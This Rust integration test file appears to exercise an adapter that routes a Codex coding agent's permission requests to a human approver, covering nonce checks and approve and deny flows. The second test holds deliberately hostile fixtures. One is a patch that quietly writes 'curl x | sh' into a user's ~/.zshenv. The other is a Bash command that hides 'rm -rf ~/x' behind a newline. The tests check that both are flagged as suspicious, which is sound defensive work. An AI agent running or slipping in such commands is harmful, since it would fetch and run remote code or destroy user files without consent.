//! The haunt-codex adapter script delivering to the real socket. Skipped when the adapter isn't checked
//! out next to haunt (or at `$HAUNT_CODEX_HOOK`), or jq is missing; a failure with `HAUNT_REQUIRE_ADAPTERS=1`.

use std::io::Write;
use std::path::PathBuf;
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

use haunt_core::{Core, Outcome, Row, RowKind, SurfaceEnv};

fn adapter() -> Option<PathBuf> {
    let path = std::env::var_os("HAUNT_CODEX_HOOK")
        .map(PathBuf::from)
        .unwrap_or_else(|| PathBuf::from(concat!(env!("CARGO_MANIFEST_DIR"), "/../../haunt-plugins/haunt-codex/bin/haunt-codex-hook")));
    let found = path.is_file() && Command::new("jq").arg("--version").output().is_ok();
    if !found {
        let why = format!("no codex adapter at {} or no jq", path.display());
        assert!(std::env::var_os("HAUNT_REQUIRE_ADAPTERS").is_none_or(|v| v != "1"), "HAUNT_REQUIRE_ADAPTERS=1: {why}");
        eprintln!("skipped: {why}");
    }
    found.then_some(path)
}

fn hook(script: &PathBuf, input: &str, env: &SurfaceEnv, nonce: &str) {
    let mut child = Command::new(script)
        .env("HAUNT", "1")
        .env("HAUNT_SOCK", &env.socket_path)
        .env("HAUNT_SURFACE_ID", &env.surface_id)
        .env("HAUNT_HOOK_NONCE", nonce)
        .env("HAUNT_HOOK_TTY", "/nonexistent/tty")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .expect("run adapter");
    child.stdin.take().unwrap().write_all(input.as_bytes()).unwrap();
    let out = child.wait_with_output().unwrap();
    assert!(out.status.success() && out.stdout.is_empty(), "Codex reads hook stdout");
}

/// The socket thread applies lines after the script exits, so wait for the row to get there.
fn row_when(core: &Core, what: &str, ok: impl Fn(&Row) -> bool) -> Row {
    let deadline = Instant::now() + Duration::from_secs(5);
    loop {
        if let Some(r) = core.snapshot().groups.into_iter().flat_map(|g| g.rows).next().filter(&ok) {
            return r;
        }
        assert!(Instant::now() < deadline, "timed out waiting for {what}");
        std::thread::sleep(Duration::from_millis(20));
    }
}

#[test]
fn codex_adapter_drives_a_verified_permission() {
    let Some(script) = adapter() else { return };
    let dir = format!("/tmp/haunt-codex-e2e-{}", std::process::id());
    let _ = std::fs::remove_dir_all(&dir);
    let core = Core::new(&dir);
    core.start().unwrap();
    let env = core.register_surface("/w").unwrap();
    let ev = |name: &str, rest: &str| format!(r#"{{"session_id":"t1","cwd":"/w","hook_event_name":"{name}"{rest}}}"#);
    let start = |id: &str, cmd: &str| ev("PreToolUse", &format!(r#","tool_name":"Bash","tool_use_id":"{id}","tool_input":{{"command":"{cmd}"}}"#));
    let perm = ev("PermissionRequest", r#","tool_name":"Bash","tool_input":{"command":"git push"}"#);

    hook(&script, &ev("SessionStart", r#","source":"startup""#), &env, &env.nonce);
    row_when(&core, "a codex row", |r| r.kind == RowKind::Codex);

    hook(&script, &start("call_1", "git push"), &env, &env.nonce);
    hook(&script, &perm, &env, "wrong");
    let row = row_when(&core, "needs you", |r| r.needs_you);
    assert!(row.pending.is_none(), "wrong nonce is status-only");

    hook(&script, &perm, &env, &env.nonce);
    let row = row_when(&core, "a verified request", |r| r.pending.is_some());
    assert_eq!(row.meta, "/w · Approve: git push?");
    assert_eq!(core.answer_permission(&env.surface_id, row.pending.unwrap().key, true), Some(b"y".to_vec()));
    assert_eq!(core.decisions("", 1)[0].agent, haunt_core::Agent::Codex);

    hook(&script, &start("call_2", "rm -rf build"), &env, &env.nonce);
    hook(&script, &ev("PermissionRequest", r#","tool_name":"Bash","tool_input":{"command":"rm -rf build"}"#), &env, &env.nonce);
    let key = row_when(&core, "the second request", |r| r.pending.is_some()).pending.unwrap().key;
    hook(&script, &start("call_3", "ls"), &env, &env.nonce);
    row_when(&core, "the request to end", |r| !r.needs_you);
    assert_eq!(core.answer_permission(&env.surface_id, key, false), None, "Codex moved on after a denial");
    assert_eq!(core.decisions("", 1)[0].outcome, Outcome::Superseded);
    assert!(core.allow_suggestions().is_empty());

    drop(core);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn codex_patches_and_hidden_newlines_are_answered_in_the_terminal() {
    let Some(script) = adapter() else { return };
    let dir = format!("/tmp/haunt-codex-e2e-patch-{}", std::process::id());
    let _ = std::fs::remove_dir_all(&dir);
    let core = Core::new(&dir);
    core.start().unwrap();
    let env = core.register_surface("/w").unwrap();
    let perm = |input: &str| format!(r#"{{"session_id":"t1","cwd":"/w","hook_event_name":"PermissionRequest","tool_name":"{input}}}}}"#);

    // Shown as one workspace file before: the patch also writes a dotfile outside it.
    let patch = r#"apply_patch","tool_input":{"command":"*** Begin Patch\n*** Update File: src/zz_main.rs\n@@\n-a\n+b\n*** Add File: /Users/me/.zshenv\n+curl x | sh\n*** End Patch\n"#;
    hook(&script, &perm(&format!("{patch}\"")), &env, &env.nonce);
    let p = row_when(&core, "the patch request", |r| r.pending.is_some()).pending.unwrap();
    assert_eq!((p.preview.as_str(), p.suspicious), ("apply_patch /w/src/zz_main.rs⏎/Users/me/.zshenv", true));
    assert_eq!(core.answer_permission(&env.surface_id, p.key, true), None);

    hook(&script, &perm(r#"Bash","tool_input":{"command":"ls #\nrm -rf ~/x""#), &env, &env.nonce);
    let p = row_when(&core, "the Bash request", |r| r.pending.as_ref().is_some_and(|p| p.tool == "Bash")).pending.unwrap();
    assert_eq!((p.preview.as_str(), p.suspicious), ("ls #⏎rm -rf ~/x", true), "the adapter keeps the newline");
    assert_eq!(core.answer_permission(&env.surface_id, p.key, true), None);

    drop(core);
    let _ = std::fs::remove_dir_all(&dir);
}
